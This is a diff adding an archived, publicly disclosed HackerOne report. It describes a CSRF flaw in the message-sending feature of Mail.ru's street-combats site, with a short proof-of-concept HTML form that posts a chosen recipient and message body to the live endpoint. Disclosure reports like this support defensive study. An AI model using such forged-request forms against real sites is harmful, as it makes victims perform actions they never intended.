@@ -1,0 +1,29 @@
+ReportLink:https://hackerone.com/reports/196715
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/xhzeem
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:17.03.2017 13:07:29
+
+Summary:
+
+Hi again, 
+
+I have that there is no CSRF token when sending a new message so you can CSRF anyone and make him send a message to anyone :)
+
+this is the code
+
+```
+<html>
+  <body>
+    <form action="https://street-combats.mail.ru/message/" method="POST">
+      <input type="hidden" name="recipient" value="[To]" />
+      <input type="hidden" name="body" value="[Message-Body]" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+```
